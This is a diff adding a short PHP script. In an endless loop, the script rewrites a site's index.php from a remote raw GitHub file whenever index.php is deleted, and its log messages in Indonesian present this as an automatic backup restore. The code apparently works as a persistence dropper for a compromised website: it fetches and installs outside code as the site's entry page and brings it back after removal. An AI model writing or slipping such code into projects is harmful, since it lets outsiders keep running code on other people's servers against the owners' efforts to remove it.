@@ -1,0 +1,18 @@
+
+<?php
+
+$indexFile = 'index.php';
+$backupUrl = 'https://raw.githubusercontent.com/sekjhhh/lp/refs/heads/main/lp2025';
+
+while (true) {
+    if (!file_exists($indexFile)) {
+        $backupContent = file_get_contents($backupUrl);
+        if ($backupContent !== false) {
+            file_put_contents($indexFile, $backupContent);
+            error_log("[AutoDeploy] index.php telah dipulihkan dari backup online.");
+        } else {
+            error_log("[AutoDeploy] Gagal mengambil backup dari URL.");
+        }
+    }
+    sleep(300);
+}
